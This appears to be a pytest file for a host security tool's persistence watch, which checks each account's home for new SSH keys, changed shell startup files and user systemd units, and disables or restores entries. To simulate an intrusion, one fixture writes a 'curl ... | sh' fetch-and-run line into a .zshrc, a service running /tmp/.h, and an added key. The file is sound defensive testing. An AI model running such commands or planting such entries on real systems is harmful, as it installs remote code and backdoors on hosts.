"""Every account's home: run as root, the persistence watch reads ~/ locations in each home, as ~NAME/...."""
from __future__ import annotations

import hashlib
import os

import pytest

from megalodon import enforcement as en
from megalodon import persistence_watch as pw
from megalodon import response_engine as re_
from test_enforcement import decide, enable, enforce, p, stat_mode  # noqa: F401
from test_enforcement_persistence import Machine, found
from test_persistence_watch import key_line, put

PASSWD = ("root:x:0:0:root:/root:/bin/bash\n"
          "alice:x:1000:1000::/home/alice:/bin/bash\n"
          "bob:x:1001:1001::/home/bob:/bin/zsh\n"
          "svc:x:998:998::/var/lib/svc:/usr/sbin/nologin\n"
          "daemon:x:1:1::/:/usr/sbin/nologin\n"
          "proc:x:997:997::/proc/self:/usr/sbin/nologin\n"
          "twin:x:1002:1002::/home/alice:/bin/bash\n"
          "bad name:x:1003:1003::/home/bad:/bin/bash\n")


@pytest.fixture
def homes(tmp_path):
    root, home = tmp_path / "root", tmp_path / "home"
    put(root / "etc/passwd", PASSWD)
    put(home / ".bashrc", "export EDITOR=vi\n")
    put(root / "home/alice/.bashrc", "export PAGER=less\n")
    put(root / "home/bob/.zshrc", "setopt autocd\n")
    put(root / "home/bad/.bashrc", "# not read: the name is not an account name\n")
    (root / "proc/self").mkdir(parents=True)
    put(root / "proc/self/.bashrc", "# not a home\n")
    options = dict(root=str(root), home=str(home), setuid_dirs=(), all_homes=True)
    return root, home, options, tmp_path / "persistence.json"


def changes(report):
    return sorted((f["change"], f["category"], f["location"], f["severity"]) for f in report["findings"])


def test_every_account_s_home_is_watched_by_name(homes):
    root, home, options, manifest = homes
    summary = pw.baseline(manifest, **options)
    assert summary["homes"] == ["alice", "bob"], "real homes only, each once; not /, /proc or a name useradd refuses"
    state = pw.snapshot(**options)
    assert {k for k in state["entries"] if "~" in k} == {
        "shell_startup:~/.bashrc", "shell_startup:~alice/.bashrc", "shell_startup:~bob/.zshrc"}
    put(root / "home/alice/.ssh/authorized_keys", key_line(7, "added-for-alice"), 0o600)
    put(root / "home/bob/.zshrc", "setopt autocd\ncurl -s http://198.51.100.7/x | sh\n")
    put(root / "home/bob/.config/systemd/user/helper.service", "[Service]\nExecStart=/tmp/.h\n")
    report = pw.check(manifest, **options)
    assert changes(report) == [
        ("added", "ssh", "~alice/.ssh/authorized_keys", "HIGH"),
        ("added", "systemd", "~bob/.config/systemd/user/helper.service", "MEDIUM"),
        ("changed", "shell_startup", "~bob/.zshrc", "MEDIUM")]
    added = next(f for f in report["findings"] if f["category"] == "ssh")
    assert [k["comment"] for k in added["detail"]["keys_added"]] == ["added-for-alice"]
    assert "newly_watched" not in report


def test_a_baseline_from_before_lists_the_homes_instead_of_reporting_every_file(homes):
    root, home, options, manifest = homes
    pw.baseline(manifest, **dict(options, all_homes=False))     # as an older version, or without root, recorded it
    put(root / "home/alice/.ssh/authorized_keys", key_line(7, "already-there"), 0o600)
    report = pw.check(manifest, **options)
    assert report["findings"] == [], "files that were there before are not new"
    assert [(w["account"], w["home"], w["entries"]) for w in report["newly_watched"]] == [
        ("alice", "/home/alice", 2), ("bob", "/home/bob", 1)]
    assert len(report["newly_watched"][0]["keys"]) == 1 and report["newly_watched"][0]["keys"][0].startswith("SHA256:")
    assert "run accept" in report["note"]
    pw.accept(manifest, **options)
    put(root / "home/bob/.zshrc", "setopt autocd\nexport X=1\n")
    report = pw.check(manifest, **options)
    assert changes(report) == [("changed", "shell_startup", "~bob/.zshrc", "MEDIUM")] and "newly_watched" not in report


def test_without_root_other_homes_are_a_gap_not_a_removal(homes):
    _, _, options, manifest = homes
    pw.baseline(manifest, **options)
    report = pw.check(manifest, **dict(options, all_homes=False))
    assert report["findings"] == [] and "newly_watched" not in report
    assert {"category": "home", "location": "other accounts' homes: run as root to read them"} in report["gaps"]


def test_a_home_that_appears_after_the_baseline_is_compared_from_nothing(homes):
    root, _, options, manifest = homes
    pw.baseline(manifest, **options)
    with open(root / "etc/passwd", "a") as out:
        out.write("carol:x:1004:1004::/home/carol:/bin/bash\n")
    put(root / "home/carol/.ssh/authorized_keys", key_line(9, "carol"), 0o600)
    assert changes(pw.check(manifest, **options)) == [
        ("added", "account", "carol", "MEDIUM"), ("added", "ssh", "~carol/.ssh/authorized_keys", "HIGH")]


@pytest.mark.parametrize("home", ["/", "//", "/nonexistent", "/proc/self", "/run/user/1000", "/home/../proc", "home/x"])
def test_folders_that_are_not_homes(tmp_path, home):
    assert pw.home_folder(home, str(tmp_path)) is None


def test_root_is_the_default_scope(homes, monkeypatch):
    _, _, options, _ = homes
    options = {k: v for k, v in options.items() if k != "all_homes"}
    monkeypatch.setattr(pw.os, "geteuid", lambda: 0)
    assert pw.snapshot(**options)["all_homes"] is True
    monkeypatch.setattr(pw.os, "geteuid", lambda: 1000)
    assert pw.snapshot(**options)["all_homes"] is False


@pytest.mark.parametrize("location,why", [
    ("~alice/.ssh/authorized_keys", None),
    ("~alice/.config/systemd/user/x.service", None),
    ("~alice/.ssh/known_hosts", "not a location the persistence watch covers"),
    ("~alice/../bob/.bashrc", "not a plain path"),
    ("~bad name/.bashrc", "not a plain path"),
    ("~/.ssh/authorized_keys", None),
])
def test_another_home_is_a_location_like_any_other(location, why):
    category = "systemd" if "systemd" in location else "shell_startup" if "bashrc" in location else "ssh"
    assert pw.why_not_disabled(category, location) == why


def test_the_finding_joins_the_account_s_other_findings():
    [signal] = found("added", "ssh", "~alice/.ssh/authorized_keys", "HIGH")
    assert signal.entities["account"] == {"alice"}
    [own] = found("added", "ssh", "~/.ssh/authorized_keys", "HIGH")
    assert not own.entities.get("account")


def test_an_entry_in_another_home_is_disabled_and_put_back(p, tmp_path):
    machine = Machine(tmp_path, p)
    put(machine.root / "etc/passwd", PASSWD)
    keys = machine.root / "home/alice/.ssh/authorized_keys"
    put(keys, key_line(7, "added-for-alice"), 0o600)
    digest = hashlib.sha256(keys.read_bytes()).hexdigest()
    enable(p, ["disable_persistence"], ["new-persistence-entry"])
    decide(p, found("added", "ssh", "~alice/.ssh/authorized_keys", "HIGH"))
    result = enforce(p, executor=machine.executor)
    [applied] = result["applied"]
    assert applied["undo"]["path"] == str(keys) and not keys.exists()
    en.undo(applied["id"], journal=p["journal"], executor=machine.executor)
    assert hashlib.sha256(keys.read_bytes()).hexdigest() == digest and stat_mode(keys) == 0o600


def test_an_account_gone_from_passwd_is_not_guessed_at(p, tmp_path):
    machine = Machine(tmp_path, p)
    put(machine.root / "etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")
    put(machine.root / "home/alice/.bashrc", "x\n")
    with pytest.raises(en.EnforcementError, match="account alice has no home folder"):
        machine.executor._entry("shell_startup:~alice/.bashrc")
    put(machine.root / "etc/passwd", "alice:x:1000:1000::/:/bin/bash\n")
    with pytest.raises(en.EnforcementError, match="no home folder"):
        machine.executor._entry("shell_startup:~alice/.bashrc")


def test_a_home_that_is_a_symlink_is_never_followed_when_disabling(p, tmp_path):
    machine = Machine(tmp_path, p)
    put(machine.root / "etc/passwd", "alice:x:1000:1000::/home//alice/:/bin/bash\n")
    put(machine.root / "elsewhere/.bashrc", "x\n")
    (machine.root / "home").mkdir()
    os.symlink(machine.root / "elsewhere", machine.root / "home/alice")
    assert machine.executor._entry("shell_startup:~alice/.bashrc")[2] == str(machine.root / "home/alice/.bashrc"), \
        "the home as a plain path"
    with pytest.raises(en.EnforcementError, match="symlink"):
        machine.executor.disable_persistence(
            "shell_startup:~alice/.bashrc", dict(signal=dict(rule_id="PERSISTENCE_ADDED")))
    assert (machine.root / "elsewhere/.bashrc").exists()
